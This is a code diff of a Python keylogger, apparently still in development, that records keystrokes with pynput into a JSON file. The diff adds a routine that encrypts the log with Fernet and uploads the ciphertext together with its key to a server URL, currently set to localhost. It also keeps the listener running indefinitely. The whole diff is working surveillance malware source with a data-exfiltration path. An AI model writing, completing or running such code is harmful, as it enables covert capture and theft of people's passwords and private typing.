@@ -3,15 +3,8 @@ import os
 import json
 from pynput import keyboard
 from cryptography.fernet import Fernet
-from requests import request
+import requests
 
-# ============================================================
-# Service (State)
-# ------------------------------------------------------------
-# Holds the runtime state:
-#   - global_log: list of "blocks" (each block is a dict: minute -> list of keys)
-#   - log_l:      current block being accumulated (minute -> list of keys)
-#   - long_str:   rolling tail of printable chars (used for simple sequence checks)
 # ============================================================
 
 class KeyLoggerService:
@@ -26,10 +19,7 @@ class KeyLoggerService:
         return time.strftime("%Y-%m-%d %H:%M", time.localtime())
 
     def make_long_str(self, key) -> None:
-        """
-        If the key is a printable char (has .char), append it to long_str.
-        We DO NOT stop the program on 'exit' – the app runs indefinitely.
-        """
+        """If the key is a printable char (has .char), append it to long_str."""
         if hasattr(key, 'char') and key.char:
             self.long_str += key.char
 
@@ -44,18 +34,6 @@ class KeyLoggerService:
         else:
             self.log_l[now] = [key]
 
-
-# ============================================================
-# File Writer (Sink) – JSON (single top-level array)
-# ------------------------------------------------------------
-# Writes valid JSON (an array) to 'keyfile.json'.
-# Every flush:
-#   1) Convert runtime blocks -> list of records
-#   2) Load existing array (if file exists), append records
-#   3) Write back as a single JSON array (pretty printed)
-#
-# This guarantees the file is always valid JSON (no JSON Lines).
-# Device grouping is kept via "device_id" on each record.
 # ============================================================
 
 class FileWriter:
@@ -114,15 +92,6 @@ class FileWriter:
         data.extend(new_records)
         self._dump_array(data)
 
-
-# ============================================================
-# Manager (Flow / Orchestration)
-# ------------------------------------------------------------
-# Responsibilities:
-#   - Handle each key event
-#   - Maintain hourly flush: at the top of a new hour, write accumulated logs to file
-#   - Do NOT stop on ESC or on the word 'exit' – program runs indefinitely
-#   - Optional: on SPACE, close the current block (kept for compatibility)
 # ============================================================
 
 class KeyLoggerManager:
@@ -210,22 +179,15 @@ class KeyLoggerManager:
         with keyboard.Listener(on_release=self.key_for_log) as listener:
             listener.join()
 
-
-# ============================================================
-# Encryptor
-# ------------------------------------------------------------
-# Provides key management (Fernet) and file encrypt/decrypt helpers.
-# Left as-is; note that if the listener runs forever, code placed after
-# starting_listening() in __main__ will not execute (by design).
 # ============================================================
 
 class Encryptor:
-    def __init__(self, key_path: str):
+    def __init__(self, key_path: str = "key.key"):
         self.key_path = key_path
         self.key: bytes | None = None
 
-    def make_key(self) -> bytes:
-        """Load existing key from disk or create a new one, store, and return it."""
+    def load_or_create_key(self) -> bytes:
+        """Load existing key from disk, or create & persist a new one."""
         if os.path.exists(self.key_path):
             with open(self.key_path, "rb") as f:
                 self.key = f.read()
@@ -233,54 +195,42 @@ class Encryptor:
             self.key = Fernet.generate_key()
             with open(self.key_path, "wb") as f:
                 f.write(self.key)
-        print("Key:", self.key.decode())
         return self.key
 
-    def encrypt_file(self, input_filename: str, output_filename: str, key: bytes) -> None:
-        """Encrypt input file and write ciphertext to output file."""
-        f = Fernet(key)
-        with open(input_filename, "rb") as fin:
-            data = fin.read()
-        enc = f.encrypt(data)
-        with open(output_filename, "wb") as fout:
-            fout.write(enc)
-
-class NetworkWriter:
-    def send_to_server(file_data, key, server_url):
-        files = {
-            "file": ("encrypted_file.bin", file_data),
-            "key": ("key.key", key)
-        }
-        response = request.post(server_url, files=files)
-        return response
-
+    def encrypt_file_to_bytes(self, input_filename: str, key: bytes) -> bytes:
+        """Read file, encrypt its bytes, and return ciphertext bytes."""
+        with open(input_filename, "rb") as f_in:
+            data = f_in.read()
+        return Fernet(key).encrypt(data)
 
 # ============================================================
-# Main
-# ------------------------------------------------------------
-# Notes:
-#   - The listener runs indefinitely (no ESC/exit stop).
-#   - Hourly flush writes valid JSON array to 'keyfile.json'.
-#   - The encryption demo below will NOT run unless you manually stop the process.
+
+class NetworkWriter:
+    @staticmethod
+    def send_encrypted_file(server_url: str, encrypted_bytes: bytes, key_bytes=None):
+        """Upload encrypted bytes to the server via multipart/form-data."""
+        files = {"file": ("encrypted_file.bin", encrypted_bytes), "key": ("key.key", key_bytes)}
+        resp = requests.post(server_url, files=files, timeout=10)
+        return resp
+
 # ============================================================
 
 if __name__ == "__main__":
+    INPUT_FILE = "keyfile.json"
+    SERVER_URL = "http://127.0.0.1:5000/upload"
+
+    enc = Encryptor("key.key")
+    key = enc.load_or_create_key()
+    encrypted_data = enc.encrypt_file_to_bytes(INPUT_FILE, key)
+
+    with open("keyfile.encrypted", "wb") as f:
+        f.write(encrypted_data)
+
+    resp = NetworkWriter.send_encrypted_file(SERVER_URL, encrypted_data, key)
+    print("Server response:", resp.status_code, resp.text)
+
     service = KeyLoggerService()
     writer = FileWriter(device_id=os.getenv("DEVICE_ID", "UNKNOWN-DEVICE"), path="keyfile.json")
     manager = KeyLoggerManager(service, writer)
+
     manager.starting_listening()
-    encrypted_data, key = encrypt_file("secret.txt")
-    resp = send_to_server(encrypted_data, key, "http://127.0.0.1:5000/upload")
-    print("Server response:", resp.text)
-
-    # The following code will not execute while the listener runs forever.
-    # Keep it here if you plan to stop the process externally and then run encryption.
-    original  = "keyfile.json"
-    encrypted = "keyfile.encrypted"
-    decrypted = "keyfile_decrypted.json"
-
-    enc = Encryptor("key.key")
-    key = enc.make_key()
-    enc.encrypt_file(original, encrypted, key)
-    enc.decrypt_file(encrypted, decrypted, key)
-    print("Encryption & Decryption done.")
